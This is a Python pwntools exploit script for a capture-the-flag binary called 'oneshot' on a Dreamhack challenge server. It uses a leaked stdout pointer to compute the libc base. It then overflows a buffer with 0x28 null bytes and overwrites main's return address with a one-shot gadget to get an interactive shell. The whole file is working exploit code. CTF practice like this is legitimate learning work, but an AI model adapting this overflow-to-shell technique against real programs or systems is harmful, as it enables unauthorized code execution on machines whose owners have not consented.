from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/oneshot')
    stdout_offset = 0x3ec760
    oneshot_offset = 0x10a2fc
else:
    r = remote('host1.dreamhack.games', 9316)
    stdout_offset = 0x3c5620
    oneshot_offset = 0xf1147


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
oneshot = libc + oneshot_offset  # oneshot gadget


# overwrite return address of main() with oneshot gadget

payload = b'\x00' * 0x28
payload += p64(oneshot)[:6]

r.sendafter('MSG: ', payload)


r.interactive()